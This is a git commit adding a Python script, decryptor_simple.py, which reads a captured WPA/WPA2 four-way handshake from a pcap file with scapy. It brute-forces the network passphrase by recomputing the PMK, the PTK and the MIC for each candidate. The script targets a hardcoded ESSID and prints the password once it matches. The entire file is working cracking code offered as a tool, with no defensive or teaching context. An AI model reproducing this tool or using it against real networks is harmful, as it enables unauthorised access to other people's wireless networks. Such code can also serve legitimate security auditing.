364d3564ac0d7a47660f312adf750917165d0240
mephisto-v <agentunknown@infopeklo.cz>
2025-03-31 16:37:34 +0200

    Add files via upload

---
+++ decryptor_simple.py
@@ -0,0 +1,152 @@
+# -*- coding: utf-8 -*-
+from scapy.all import rdpcap, EAPOL, Dot11, Raw
+from binascii import hexlify, a2b_hex
+from hashlib import pbkdf2_hmac, sha1
+from hmac import new
+from itertools import product
+from time import time
+import os
+from custom_hashlib import main_hmac
+
+
+def check(pkt, handshakes, bssid, cl):
+    fNONCE = b'00'*32
+    fMIC = b'00'*16
+
+    if pkt.haslayer(EAPOL):
+        __sn = pkt[Dot11].addr2
+        __rc = pkt[Dot11].addr1
+        to_DS = pkt.getlayer(Dot11).FCfield & 0x1 != 0
+        from_DS = pkt.getlayer(Dot11).FCfield & 0x2 != 0
+
+        if from_DS:
+            nonce = hexlify(pkt.getlayer(Raw).load)[26:90]
+            mic = hexlify(pkt.getlayer(Raw).load)[154:186]
+            if nonce != fNONCE and mic == fMIC:
+                bssid = __sn
+                cl = __rc
+                handshakes[0] = pkt
+            elif (__sn == bssid and __rc == cl and
+                    nonce != fNONCE and mic != fMIC):
+                handshakes[2] = pkt
+
+        elif to_DS:
+            nonce = hexlify(pkt.getlayer(Raw).load)[26:90]
+            mic = hexlify(pkt.getlayer(Raw).load)[154:186]
+
+            if (__sn == cl and __rc == bssid and
+                    nonce != fNONCE and mic != fMIC):
+                handshakes[1] = pkt
+
+            elif (__sn == cl and __rc == bssid and
+                    nonce == fNONCE and mic != fMIC):
+                handshakes[3] = pkt
+
+    return bssid, cl
+
+
+def organize(bssid, cl, handshakes):
+    __NULL_ = b"\x00"
+    bssid = a2b_hex(bssid.replace(':', '').lower())
+    cl = a2b_hex(cl.replace(':', '').lower())
+    aNONCE = a2b_hex(hexlify(handshakes[0].getlayer(Raw).load)[26:90])
+    cNONCE = a2b_hex(hexlify(handshakes[1].getlayer(Raw).load)[26:90])
+    key_data = (min(bssid, cl) + max(bssid, cl) +
+                min(aNONCE, cNONCE) + max(aNONCE, cNONCE))
+    mic = hexlify(handshakes[1].getlayer(Raw).load)[154:186]
+    version = chr(handshakes[1].getlayer(EAPOL).version).encode()
+    eap_type = chr(handshakes[1].getlayer(EAPOL).type).encode()
+    eap_len = chr(handshakes[1].getlayer(EAPOL).len).encode()
+
+    payload = (a2b_hex(hexlify(version + eap_type + __NULL_ + eap_len +
+               a2b_hex(hexlify(handshakes[1].getlayer(Raw).load)[:154]) +
+               __NULL_ * 16 +
+               a2b_hex(hexlify(handshakes[1].getlayer(Raw).load)[186:]))))
+
+    return key_data, mic, payload
+
+
+def customPRF512(key, A, B):
+    blen = 64
+    i = 0
+    R = b''
+    while i <= ((blen*8+159)//160):
+        # hmacsha1 = new(key, (A + b'\x00' + B + bytes([i])), sha1)
+        # hmacsha1 = hmacsha1.digest()
+        hmacsha1 = main_hmac(key=key, data=(A + b'\x00' + B + bytes([i])))
+        i += 1
+        R += hmacsha1
+    return R[:blen]
+
+
+def customPRF512_test(key, A, B):
+    BLEN = 64
+    end = (BLEN * 8 + 159) // 160 + 1
+    prepared_data = A + b'\x00' + B
+
+    R = b''.join([
+        main_hmac(
+            key=key,
+            data=(prepared_data + bytes([i]))
+        )
+        for i in range(end)
+    ])
+    return R[:BLEN]
+
+
+def main():
+    print('Number of CPUs: ', os.cpu_count())
+
+    packets = rdpcap('packets.pcap')
+    handshakes = [0, 0, 0, 0]
+    essid = 'RT-WiFi-15C2'
+    bssid = ''
+    cl = ''
+
+    LATIN_LOWER = 'abcdefghijklmnopqrstuvwxyz'
+    LATIN_UPPER = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    NUMBERS = '0123456789'
+    CUSTOM = 'aefiwh'
+
+    characters = CUSTOM
+    rep = 4
+    length = len(characters)**rep
+    print(f"{length} passwords will be generated")
+
+    passwords = product(characters, repeat=rep)
+
+    for pkt in packets:
+        bssid, cl = check(pkt, handshakes, bssid, cl)
+
+    if all(handshakes):
+        print("The packets were successfully checked!\n")
+
+    key_data, mic, payload = organize(bssid, cl, handshakes)
+
+    start = time()
+    for i, passwrd in enumerate(passwords):
+        password = ''.join(passwrd)
+        if i % 200 == 0:
+            print(password)
+            print("-----")
+
+        pmk = pbkdf2_hmac('sha1', password.encode(), essid.encode(), 4096, 32)
+
+        ptk = customPRF512(pmk, b"Pairwise key expansion", key_data)
+
+        # _mic = hmac.new(_ptk[0:16], payload, md5).hexdigest()
+        _mic_ = new(ptk[0:16], payload, sha1).hexdigest()[:32]
+
+        _mic_ = _mic_.encode()
+        # if mic == mic or mic == _mic_
+        if mic == _mic_:
+            print('The password has been found: ' , password)
+            print(i)
+            break
+
+    end = time() - start
+    print(f"It has taken {end} seconds!")
+
+
+if __name__ == "__main__":
+    main()
